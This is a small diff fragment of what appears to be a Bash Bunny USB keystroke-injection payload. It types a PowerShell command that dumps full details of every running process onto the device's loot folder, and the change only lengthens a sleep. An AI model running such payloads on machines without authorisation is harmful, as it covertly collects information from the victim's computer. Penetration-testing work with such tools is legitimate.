@@ -31,7 +31,7 @@ QUCK DELAY 1000
 QUACK STRING "\$Bunny = (gwmi win32_volume -f 'label=\"BashBunny\"' | Select-Object -ExpandProperty DriveLetter); Get-Process | Format-List -Property * | Out-File \$Bunny\\loot\\ProcessInfo\\ProcessInfo.txt; exit"
 QUACK ENTER
 LED R G B 100
-sleep 1
+sleep 3
 
 # Sync File System
 LED B 100
